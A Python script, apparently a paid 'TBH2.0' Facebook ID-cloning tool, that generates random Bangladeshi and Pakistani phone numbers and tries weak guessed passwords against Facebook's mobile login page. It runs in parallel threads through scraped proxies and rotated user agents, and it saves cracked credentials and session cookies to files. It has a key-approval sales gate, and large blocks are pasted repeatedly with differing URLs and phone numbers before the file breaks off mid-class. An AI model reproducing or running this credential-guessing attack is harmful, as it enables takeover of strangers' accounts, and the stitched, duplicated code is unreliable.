import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA    
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG    
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

os.system("xdg-open https://facebook.com/groups/647002200235764/")
logo = ("""                                                                                                                            
\033[1;31m████████╗\033[1;32m██████╗\033[1;31m ██╗  ██╗\033[1;32m██████╗   \033[1;31m  ██████╗ 
\033[1;31m╚══██╔══╝\033[1;32m██╔══██╗\033[1;31m██║  ██║\033[1;32m╚════██╗   \033[1;31m██╔═████╗
   \033[1;31m██║   \033[1;32m██████╔╝\033[1;31m███████║\033[1;32m █████╔╝  \033[1;31m ██║██╔██║
\033[1;31m   ██║   \033[1;32m██╔══██╗\033[1;31m██╔══██║\033[1;32m██╔═══╝ \033[1;31m   ████╔╝██║
 \033[1;31m  ██║   \033[1;32m██████╔╝\033[1;31m██║  ██║\033[1;32m███████╗\033[1;34m██╗\033[1;31m╚██████╔╝
\033[1;31m   ╚═╝ \033[1;32m  ╚═════╝ \033[1;31m╚═╝  ╚═╝\033[1;32m╚══════╝\033[1;34m╚═╝\033[1;31m ╚═════╝ 
                                                      
         
""")

import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA    
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG    
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

os.system("xdg-open https://facebook.com/groups/647002200235764/")
logo = ("""                                                                                                                            
\033[1;31m████████╗\033[1;32m██████╗\033[1;31m ██╗  ██╗\033[1;32m██████╗   \033[1;31m  ██████╗ 
\033[1;31m╚══██╔══╝\033[1;32m██╔══██╗\033[1;31m██║  ██║\033[1;32m╚════██╗   \033[1;31m██╔═████╗
   \033[1;31m██║   \033[1;32m██████╔╝\033[1;31m███████║\033[1;32m █████╔╝  \033[1;31m ██║██╔██║
\033[1;31m   ██║   \033[1;32m██╔══██╗\033[1;31m██╔══██║\033[1;32m██╔═══╝ \033[1;31m   ████╔╝██║
 \033[1;31m  ██║   \033[1;32m██████╔╝\033[1;31m██║  ██║\033[1;32m███████╗\033[1;34m██╗\033[1;31m╚██████╔╝
\033[1;31m   ╚═╝ \033[1;32m  ╚═════╝ \033[1;31m╚═╝  ╚═╝\033[1;32m╚══════╝\033[1;34m╚═╝\033[1;31m ╚═════╝ 
                                                      
         
""")

balpakna =("""\x1b[38;5;50mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 150TK 30 500TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[ðŸ·] ðšˆð™¾ðš„ðš ðšƒð™¾ð™ºð™´ð™½ ð™¸ðš‚ ðš‚ðš„ð™²ð™²ð™´ðš‚ðš‚ð™µðš„ð™»ð™»ðšˆ ð™°ð™¿ð™¿ðšð™¾ðš…ð™´ð™³""")
xudinaministar =(""" \033[38;1m[-] Importent Note """)
hedaborakarent =(""" \033[35;1m[ðŸ¸] ð™µðš„ð™²ð™º ð™±ðšˆð™¿ð™°ðš‚ð™°ðš ð™²ð™·ð™°ð™ºð™´ ðšˆð™¾ðš„ðš ð™³ð™°ðšƒð™° ABALðŸ˜Ž """)

def meyexudi():
  os.system('clear')
  print(logo)
  os.system("xdg-open https://www.facebook.com/profile.php?id=61553667249316")
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/NIROB542/VOT/blob/main/NIROB.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid)
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
     # print(" \033[32;1m[+] Your Kay : "+id)
      print(' \x1b[38;5;208mâ•”â•â•[ðŸ·]ðŸ’¥  FREE-FIRE-TIK-TOK- ID CLONING')      
      print(' \x1b[1;98mâ•‘â•â•[ðŸ¸]ðŸ’¥  ONLY ACTIVE ID CLONE 100%')
      print(' \x1b[1;93mâ•‘â•â•[3]ðŸ’¥  Wi-fi & Data both working')
      print(' \x1b[1;93mâ•‘â•â•[4]ðŸ’¥  CP ID WILL BE LOGIN 80%')
      print(' \x1b[1;95mâ•‘â•â•[5]ðŸ’¥  15 DAY 250 TAKA ')
      print(' \x1b[38;5;50mâ•‘â•â•[6]ðŸ’¥  30 DAY 500 TAKA ')
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   TBH2.0,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0mâ•‘â•â•[7] YOUR KEY : TBH-RANDOM :-"+id)
      input(' \033[1;30mâ•šâ•â•[8] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801839270542?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
balpakna =("""\x1b[38;5;50mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 150TK 30 500TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[ðŸ·] ðšˆð™¾ðš„ðš ðšƒð™¾ð™ºð™´ð™½ ð™¸ðš‚ ðš‚ðš„ð™²ð™²ð™´ðš‚ðš‚ð™µðš„ð™»ð™»ðšˆ ð™°ð™¿ð™¿ðšð™¾ðš…ð™´ð™³""")
xudinaministar =(""" \033[38;1m[-] Importent Note """)
hedaborakarent =(""" \033[35;1m[ðŸ¸] ð™µðš„ð™²ð™º ð™±ðšˆð™¿ð™°ðš‚ð™°ðš ð™²ð™·ð™°ð™ºð™´ ðšˆð™¾ðš„ðš ð™³ð™°ðšƒð™° ABALðŸ˜Ž """)

def meyexudi():
  os.system('clear')
  print(logo)
  os.system("xdg-open https://www.facebook.com/profile.php?id=61553667249316")
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Kali-Linux20/Kali/blob/main/Approved.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
     # print(" \033[32;1m[+] Your Kay : "+id)
      print(' \x1b[38;5;208mâ•”â•â•[ðŸ·]ðŸ’¥  FREE-FIRE-TIK-TOK- ID CLONING')      
      print(' \x1b[1;98mâ•‘â•â•[ðŸ¸]ðŸ’¥  ONLY ACTIVE ID CLONE 100%')
      print(' \x1b[1;93mâ•‘â•â•[3]ðŸ’¥  Wi-fi & Data both working')
      print(' \x1b[1;93mâ•‘â•â•[4]ðŸ’¥  CP ID WILL BE LOGIN 80%')
      print(' \x1b[1;95mâ•‘â•â•[5]ðŸ’¥  15 DAY 250 TAKA ')
      print(' \x1b[38;5;50mâ•‘â•â•[6]ðŸ’¥  30 DAY 500 TAKA ')
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   TBH2.0,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0mâ•‘â•â•[7] YOUR KEY : TBH-RANDOM :-"+id)
      input(' \033[1;30mâ•šâ•â•[8] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801839270542?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
os.system('clear')
attemps = 0

while attemps < 12345677901:
    username = input(' \033[0;92mEnter Username: ')
    password = input(' \033[0;93mEnter Password: ')

    if username == 'kali' and password == 'TBH2.0':
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[38;5;46m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;32m�\033[1;35m�\033[1;34m�\033[1;97m�\033[1;33m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[38;5;196m�\033[1;32m�\033[1;97m�\033[1;35m�\033[1;34m�\033[1;33m�\033[38;5;46m�\033[1;97m�")
        print(" \033[1;97m[1] FACEBOOK VIP RANDOM CLONING   \033[1;33m[FIRE]")
        print(" \033[1;97m[0] Exit")
        print("\033[38;5;46m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;32m�\033[1;35m�\033[1;34m�\033[1;97m�\033[1;33m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[38;5;196m�\033[1;32m�\033[1;97m�\033[1;35m�\033[1;34m�\033[1;33m�\033[38;5;46m�\033[1;97m�")
        TBH =input(" [] Choose : ")
        if TBH in ["1", "01","A","a"]:
            v1()
      
        if TBH in [" 0", "00"]:
            exit()
        else:
            Main()

def v1():
    user=[]
    os.system('clear')
    print(logo)
    print(" BD SIM CODE=><>< +88017,+88018,+88019,+88014,+88013")
    print("\033[38;5;46m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;32m�\033[1;35m�\033[1;34m�\033[1;97m�\033[1;33m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[38;5;196m�\033[1;32m�\033[1;97m�\033[1;35m�\033[1;34m�\033[1;33m�\033[38;5;46m�\033[1;97m�")
    print(" \033[1;32mPAK SIM CODE=><>< +92301,+92302,+92303,+92305")
    print(" \033[38;5;46m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;32m�\033[1;35m�\033[1;34m�\033[1;97m�\033[1;33m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[38;5;196m�\033[1;32m�\033[1;97m�\033[1;35m�\033[1;34m�\033[1;33m�\033[38;5;46m�\033[1;97m�")
    print(" NOTE ; THOSE  WHO STAY IN THEIR COUNTRY THEY CAN GIVE THEIR SIM CODE NUNBER TO FACEBOOK RANDOM ID CLONE")
    print(" \033[38;5;46m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;32m�\033[1;35m�\033[1;34m�\033[1;97m�\033[1;33m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[38;5;196m�\033[1;32m�\033[1;97m�\033[1;35m�\033[1;34m�\033[1;33m�\033[38;5;46m�\033[1;97m�")
    
    kode = input(' [] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' FACEBOOK VIP CLONING (BD NUMBER) '
    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;33m[]  TOTAL IDS :\033[1;92m '+tl)
        print(f"\033[1;33m[]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
        print(' \033[1;33m[]  THE CRACK PROCESS HAS BEEN STARTED')
        print(' \033[1;33m[]  WAIT FOR IDS ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [] Crack process has been completed')
    print(' [] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mANONYMOUS-TBH2.0\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=zJBAZQU23oW92U52eFUrjnYO; sb=0JBAZc003cnaBOO6I04y6X08; m_pixel_ratio=2; wd=360x668; fr=0tMqz4So2fVbfDZoe..BlQOSm.56.AAA.0.0.BlQPE0.AWUQZ5fvQD0',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"RMX3171"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[HACKED successful-OK] {uid}|{ps}")
                print(f"\n[COOKIE] : {coki}")
                open('/sdcard/TBH2.0/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SORRY-CP] {uid}|{ps}")
                open('/sdcard/TBH2.0-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[  TBH2.0] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
balpakna =("""\x1b[38;5;50mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 150TK 30 500TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[ðŸ·] ðšˆð™¾ðš„ðš ðšƒð™¾ð™ºð™´ð™½ ð™¸ðš‚ ðš‚ðš„ð™²ð™²ð™´ðš‚ðš‚ð™µðš„ð™»ð™»ðšˆ ð™°ð™¿ð™¿ðšð™¾ðš…ð™´ð™³""")
xudinaministar =(""" \033[38;1m[-] Importent Note """)
hedaborakarent =(""" \033[35;1m[ðŸ¸] ð™µðš„ð™²ð™º ð™±ðšˆð™¿ð™°ðš‚ð™°ðš ð™²ð™·ð™°ð™ºð™´ ðšˆð™¾ðš„ðš ð™³ð™°ðšƒð™° ABALðŸ˜Ž """)

def meyexudi():
  os.system('clear')
  print(logo)
  os.system("xdg-open https://www.facebook.com/profile.php?id=61553667249316")
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Kali-Linux20/Kali/blob/main/Approved.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
     # print(" \033[32;1m[+] Your Kay : "+id)
      print(' \x1b[38;5;208mâ•”â•â•[ðŸ·]ðŸ’¥  FREE-FIRE-TIK-TOK- ID CLONING')      
      print(' \x1b[1;98mâ•‘â•â•[ðŸ¸]ðŸ’¥  ONLY ACTIVE ID CLONE 100%')
      print(' \x1b[1;93mâ•‘â•â•[3]ðŸ’¥  Wi-fi & Data both working')
      print(' \x1b[1;93mâ•‘â•â•[4]ðŸ’¥  CP ID WILL BE LOGIN 80%')
      print(' \x1b[1;95mâ•‘â•â•[5]ðŸ’¥  15 DAY 250 TAKA ')
      print(' \x1b[38;5;50mâ•‘â•â•[6]ðŸ’¥  30 DAY 500 TAKA ')
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   TBH2.0,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0mâ•‘â•â•[7] YOUR KEY : TBH-RANDOM :-"+id)
      input(' \033[1;30mâ•šâ•â•[8] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801828252314?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
balpakna =("""\x1b[38;5;50mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 150TK 30 500TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[ðŸ·] ðšˆð™¾ðš„ðš ðšƒð™¾ð™ºð™´ð™½ ð™¸ðš‚ ðš‚ðš„ð™²ð™²ð™´ðš‚ðš‚ð™µðš„ð™»ð™»ðšˆ ð™°ð™¿ð™¿ðšð™¾ðš…ð™´ð™³""")
xudinaministar =(""" \033[38;1m[-] Importent Note """)
hedaborakarent =(""" \033[35;1m[ðŸ¸] ð™µðš„ð™²ð™º ð™±ðšˆð™¿ð™°ðš‚ð™°ðš ð™²ð™·ð™°ð™ºð™´ ðšˆð™¾ðš„ðš ð™³ð™°ðšƒð™° ABALðŸ˜Ž """)

def meyexudi():
  os.system('clear')
  print(logo)
  os.system("xdg-open https://www.facebook.com/profile.php?id=61553667249316")
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Kali-Linux20/Kali/blob/main/Approved.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
     # print(" \033[32;1m[+] Your Kay : "+id)
      print(' \x1b[38;5;208mâ•”â•â•[ðŸ·]ðŸ’¥  FREE-FIRE-TIK-TOK- ID CLONING')      
      print(' \x1b[1;98mâ•‘â•â•[ðŸ¸]ðŸ’¥  ONLY ACTIVE ID CLONE 100%')
      print(' \x1b[1;93mâ•‘â•â•[3]ðŸ’¥  Wi-fi & Data both working')
      print(' \x1b[1;93mâ•‘â•â•[4]ðŸ’¥  CP ID WILL BE LOGIN 80%')
      print(' \x1b[1;95mâ•‘â•â•[5]ðŸ’¥  15 DAY 250 TAKA ')
      print(' \x1b[38;5;50mâ•‘â•â•[6]ðŸ’¥  30 DAY 500 TAKA ')
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   TBH2.0,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0mâ•‘â•â•[7] YOUR KEY : TBH-RANDOM :-"+id)
      input(' \033[1;30mâ•šâ•â•[8] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801828252314?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
os.system('clear')
attemps = 0

while attemps < 12345677901:
    username = input(' \033[0;92mEnter Username: ')
    password = input(' \033[0;93mEnter Password: ')

    if username == 'kali' and password == 'TBH2.0':
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[38;5;46m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;32m�\033[1;35m�\033[1;34m�\033[1;97m�\033[1;33m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[38;5;196m�\033[1;32m�\033[1;97m�\033[1;35m�\033[1;34m�\033[1;33m�\033[38;5;46m�\033[1;97m�")
        print(" \033[1;97m[1] FACEBOOK VIP RANDOM CLONING   \033[1;33m[FIRE]")
        print(" \033[1;97m[0] Exit")
